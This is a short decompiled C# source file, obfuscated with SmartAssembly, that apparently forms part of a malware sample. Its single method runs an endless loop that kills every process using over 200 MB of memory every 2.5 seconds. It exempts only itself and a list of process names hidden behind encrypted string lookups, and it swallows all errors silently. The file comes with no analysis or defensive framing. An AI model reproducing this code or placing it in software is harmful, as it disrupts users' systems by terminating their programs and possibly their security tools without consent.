using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace VyjVuXvolaw;

public static class EcAxyFJmHllOi
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void jiNXctNQGFMisY()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107400857)) && !process.ProcessName.Contains(getString_0(107400816)) && !process.ProcessName.Contains(getString_0(107400807)) && !process.ProcessName.Contains(getString_0(107400830)) && !process.ProcessName.Contains(getString_0(107400785)) && !process.ProcessName.Contains(getString_0(107400804)) && !process.ProcessName.Contains(getString_0(107400791)) && !process.ProcessName.Contains(getString_0(107400746)) && !process.ProcessName.Contains(getString_0(107400765)) && !process.ProcessName.Contains(getString_0(107400720)) && !process.ProcessName.Contains(getString_0(107400731)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static EcAxyFJmHllOi()
	{
		Strings.CreateGetStringDelegate(typeof(EcAxyFJmHllOi));
	}
}
